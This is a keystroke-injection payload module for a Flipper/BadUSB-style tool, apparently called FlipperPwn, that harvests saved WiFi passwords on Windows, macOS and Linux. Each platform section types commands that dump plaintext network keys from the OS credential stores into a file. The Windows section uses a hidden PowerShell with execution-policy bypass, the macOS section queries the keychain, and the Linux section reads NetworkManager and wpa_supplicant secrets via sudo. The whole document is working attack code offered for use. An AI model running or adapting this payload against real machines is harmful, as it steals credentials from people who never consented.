# FlipperPwn Module: WiFi Password Harvesting
# Extracts plaintext WiFi credentials from the OS credential store.
# Windows: netsh reads directly from WLAN service (no admin needed for profiles the user owns).
# macOS: security command queries keychain — prompts user for approval on modern macOS.
# Linux: requires sudo for NetworkManager connection files.

NAME wifi_harvest
DESCRIPTION Extract saved WiFi passwords from OS credential stores
CATEGORY credential
PLATFORMS WIN,MAC,LINUX

# No options required

PLATFORM WIN
  # Open hidden PowerShell via Run dialog
  DELAY 500
  GUI r
  DELAY 300
  STRING powershell -w h -nop -ep bypass
  ENTER
  DELAY 1000
  # Iterate all saved WLAN profiles and dump key=clear output for each
  # This does NOT require admin — WLAN service exposes user-owned profiles
  STRING $o="$env:TEMP\wifi_creds.txt"; "=== WIFI CREDENTIAL HARVEST ===" | Out-File $o; (netsh wlan show profiles) -match 'All User Profile' | ForEach-Object { $n=($_ -split ':')[1].Trim(); "--- Profile: $n ---" | Out-File $o -Append; netsh wlan show profile name="$n" key=clear | Out-File $o -Append }; Start-Process notepad $o
  ENTER

PLATFORM MAC
  # Open Terminal via Spotlight
  DELAY 500
  GUI SPACE
  DELAY 400
  STRING Terminal
  ENTER
  DELAY 1200
  # Retrieve SSID list then query keychain for each password.
  # macOS 12+ will show a UI approval dialog for each keychain access — this is expected.
  STRING o=/tmp/wifi_creds.txt; echo "=== WIFI CREDENTIAL HARVEST ===" > $o; networksetup -listpreferredwirelessnetworks en0 2>/dev/null | tail -n +2 | while read ssid; do ssid=$(echo "$ssid" | xargs); echo "--- SSID: $ssid ---" >> $o; security find-generic-password -D "AirPort network password" -a "$ssid" -w 2>/dev/null >> $o || echo "(no keychain entry)" >> $o; done; open -e $o
  ENTER

PLATFORM LINUX
  # Open terminal emulator
  DELAY 500
  CTRL ALT t
  DELAY 1000
  # NM connection files store PSK in plaintext — requires root to read
  # nmcli --show-secrets works for connections the current user owns without sudo
  STRING o=/tmp/wifi_creds.txt; echo "=== WIFI CREDENTIAL HARVEST ===" > $o; echo "--- nmcli (user connections) ---" >> $o; nmcli --show-secrets connection show 2>/dev/null | grep -E 'psk:|ssid' >> $o; echo "--- NM connection files (needs sudo) ---" >> $o; sudo grep -h -E 'ssid=|psk=' /etc/NetworkManager/system-connections/*.nmconnection 2>/dev/null >> $o; echo "--- wpa_supplicant.conf ---" >> $o; sudo cat /etc/wpa_supplicant/wpa_supplicant.conf 2>/dev/null >> $o; xdg-open $o 2>/dev/null || cat $o
  ENTER
